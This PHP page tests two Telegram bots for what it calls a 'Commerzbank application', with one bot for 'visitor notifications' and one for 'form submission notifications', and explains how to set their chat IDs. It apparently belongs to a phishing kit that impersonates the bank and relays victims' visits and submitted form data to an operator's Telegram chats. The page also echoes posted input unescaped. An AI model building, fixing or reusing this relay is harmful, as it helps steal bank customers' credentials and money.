<?php
// Test script for Telegram bots
// This will help diagnose connectivity issues and get correct chat IDs

// Include the Telegram configuration
include 'config/telegram.php';

echo "<!DOCTYPE html>
<html lang='de'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Telegram Bot Test - Commerzbank</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .success { background: #d4edda; border-color: #c3e6cb; color: #155724; }
        .error { background: #f8d7da; border-color: #f5c6cb; color: #721c24; }
        .warning { background: #fff3cd; border-color: #ffeaa7; color: #856404; }
        .info { background: #d1ecf1; border-color: #bee5eb; color: #0c5460; }
        .code { background: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; margin: 10px 0; }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
        button:hover { background: #0056b3; }
        input[type='text'] { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 3px; }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
    </style>
</head>
<body>
    <div class='container'>
        <h1>🔧 Telegram Bot Test & Configuration</h1>
        <p>This tool will help diagnose and fix Telegram bot connectivity issues.</p>";

// Test 1: Check if functions exist
echo "<div class='test-section info'>
    <h3>📋 Function Availability Test</h3>";
if (function_exists('sendTelegramMessage')) {
    echo "<p class='success'>✅ sendTelegramMessage function is available</p>";
} else {
    echo "<p class='error'>❌ sendTelegramMessage function is missing</p>";
}

if (function_exists('sendTelegramPhoto')) {
    echo "<p class='success'>✅ sendTelegramPhoto function is available</p>";
} else {
    echo "<p class='error'>❌ sendTelegramPhoto function is missing</p>";
}

if (function_exists('testTelegramBot')) {
    echo "<p class='success'>✅ testTelegramBot function is available</p>";
} else {
    echo "<p class='error'>❌ testTelegramBot function is missing</p>";
}
echo "</div>";

// Test 2: Check current configuration
echo "<div class='test-section info'>
    <h3>⚙️ Current Configuration</h3>
    <p><strong>Bot 1 Token:</strong> " . substr($telegram_bot1_token, 0, 20) . "...</p>
    <p><strong>Bot 1 Chat ID:</strong> $telegram_bot1_chat_id</p>
    <p><strong>Bot 2 Token:</strong> " . substr($telegram_bot2_token, 0, 20) . "...</p>
    <p><strong>Bot 2 Chat ID:</strong> $telegram_bot2_chat_id</p>
    <p><strong>Telegram Enabled:</strong> " . ($enable_telegram ? 'Yes' : 'No') . "</p>
</div>";

// Test 3: Test bot connectivity
echo "<div class='test-section info'>
    <h3>🔗 Bot Connectivity Test</h3>";

if (function_exists('testTelegramBot')) {
    echo "<p>Testing Bot 1 connectivity...</p>";
    $bot1_test = testTelegramBot($telegram_bot1_token, $telegram_bot1_chat_id);
    if ($bot1_test) {
        echo "<p class='success'>✅ Bot 1 is connected and responding</p>";
    } else {
        echo "<p class='error'>❌ Bot 1 connection failed</p>";
    }
    
    echo "<p>Testing Bot 2 connectivity...</p>";
    $bot2_test = testTelegramBot($telegram_bot2_token, $telegram_bot2_chat_id);
    if ($bot2_test) {
        echo "<p class='success'>✅ Bot 2 is connected and responding</p>";
    } else {
        echo "<p class='error'>❌ Bot 2 connection failed</p>";
    }
} else {
    echo "<p class='error'>❌ testTelegramBot function not available</p>";
}
echo "</div>";

// Test 4: Send test messages
echo "<div class='test-section info'>
    <h3>📤 Send Test Messages</h3>
    <p>Click the buttons below to send test messages to verify the bots are working:</p>
    
    <form method='post' action=''>
        <div class='form-group'>
            <label>Test Message:</label>
            <input type='text' name='test_message' value='🧪 Test message from Commerzbank application - " . date('Y-m-d H:i:s') . "' placeholder='Enter test message'>
        </div>
        
        <button type='submit' name='test_bot1'>📤 Send Test to Bot 1</button>
        <button type='submit' name='test_bot2'>📤 Send Test to Bot 2</button>
        <button type='submit' name='test_photo'>📷 Send Test Photo to Both Bots</button>
    </form>
</div>";

// Handle test submissions
if ($_POST) {
    if (isset($_POST['test_bot1'])) {
        $message = $_POST['test_message'] ?? '🧪 Test message from Bot 1 - ' . date('Y-m-d H:i:s');
        $result = sendTelegramMessage($telegram_bot1_token, $telegram_bot1_chat_id, $message);
        if ($result) {
            echo "<div class='test-section success'>
                <h3>✅ Bot 1 Test Message Sent Successfully</h3>
                <p>Message: $message</p>
                <p>Check your Telegram chat with Bot 1 to confirm receipt.</p>
            </div>";
        } else {
            echo "<div class='test-section error'>
                <h3>❌ Bot 1 Test Message Failed</h3>
                <p>Message: $message</p>
                <p>Check the error logs for more details.</p>
            </div>";
        }
    }
    
    if (isset($_POST['test_bot2'])) {
        $message = $_POST['test_message'] ?? '🧪 Test message from Bot 2 - ' . date('Y-m-d H:i:s');
        $result = sendTelegramMessage($telegram_bot2_token, $telegram_bot2_chat_id, $message);
        if ($result) {
            echo "<div class='test-section success'>
                <h3>✅ Bot 2 Test Message Sent Successfully</h3>
                <p>Message: $message</p>
                <p>Check your Telegram chat with Bot 2 to confirm receipt.</p>
            </div>";
        } else {
            echo "<div class='test-section error'>
                <h3>❌ Bot 2 Test Message Failed</h3>
                <p>Message: $message</p>
                <p>Check the error logs for more details.</p>
            </div>";
        }
    }
    
    if (isset($_POST['test_photo'])) {
        // Create a simple test image
        $test_image_path = 'test_image.png';
        $image = imagecreate(200, 100);
        $bg_color = imagecolorallocate($image, 255, 204, 0); // Commerzbank yellow
        $text_color = imagecolorallocate($image, 0, 0, 0);
        imagestring($image, 5, 20, 40, 'Test Image', $text_color);
        imagepng($image, $test_image_path);
        imagedestroy($image);
        
        $caption = '📷 Test photo from Commerzbank app - ' . date('Y-m-d H:i:s');
        
        // Send to both bots
        $bot1_photo = sendTelegramPhoto($telegram_bot1_token, $telegram_bot1_chat_id, $test_image_path, $caption);
        $bot2_photo = sendTelegramPhoto($telegram_bot2_token, $telegram_bot2_chat_id, $test_image_path, $caption);
        
        if ($bot1_photo && $bot2_photo) {
            echo "<div class='test-section success'>
                <h3>✅ Test Photos Sent Successfully to Both Bots</h3>
                <p>Caption: $caption</p>
                <p>Check both Telegram chats to confirm receipt.</p>
            </div>";
        } else {
            echo "<div class='test-section error'>
                <h3>❌ Test Photos Failed</h3>
                <p>Bot 1: " . ($bot1_photo ? 'Success' : 'Failed') . "</p>
                <p>Bot 2: " . ($bot2_photo ? 'Success' : 'Failed') . "</p>
                <p>Check the error logs for more details.</p>
            </div>";
        }
        
        // Clean up test image
        if (file_exists($test_image_path)) {
            unlink($test_image_path);
        }
    }
}

// Instructions for fixing chat IDs
echo "<div class='test-section warning'>
    <h3>🔧 How to Fix Chat ID Issues</h3>
    <p><strong>If the bots are not working, the most likely issue is incorrect chat IDs.</strong></p>
    
    <h4>Step 1: Get Your Chat ID</h4>
    <ol>
        <li>Start a chat with your bot in Telegram</li>
        <li>Send any message to the bot</li>
        <li>Visit this URL in your browser: <code>https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates</code></li>
        <li>Replace YOUR_BOT_TOKEN with your actual bot token</li>
        <li>Look for the 'chat' object and find your 'id' number</li>
    </ol>
    
    <h4>Step 2: Update Configuration</h4>
    <p>Once you have your correct chat ID, update the <code>config/telegram.php</code> file:</p>
    <div class='code'>
        // Bot 1 - Visitor notifications<br>
        \$telegram_bot1_chat_id = 'YOUR_ACTUAL_CHAT_ID';<br><br>
        // Bot 2 - Form submission notifications<br>
        \$telegram_bot2_chat_id = 'YOUR_ACTUAL_CHAT_ID';
    </div>
    
    <h4>Step 3: Test Again</h4>
    <p>After updating the chat IDs, refresh this page and test the bots again.</p>
</div>";

// Show error logs if available
echo "<div class='test-section info'>
    <h3>📋 Recent Error Logs</h3>";
if (file_exists('../logs/error.log')) {
    $logs = file_get_contents('../logs/error.log');
    $recent_logs = array_slice(explode("\n", $logs), -10); // Last 10 lines
    echo "<div class='code'>";
    foreach ($recent_logs as $log) {
        if (trim($log)) {
            echo htmlspecialchars($log) . "<br>";
        }
    }
    echo "</div>";
} else {
    echo "<p>No error logs found. Check if logging is enabled.</p>";
}
echo "</div>";

echo "</div></body></html>";
?>
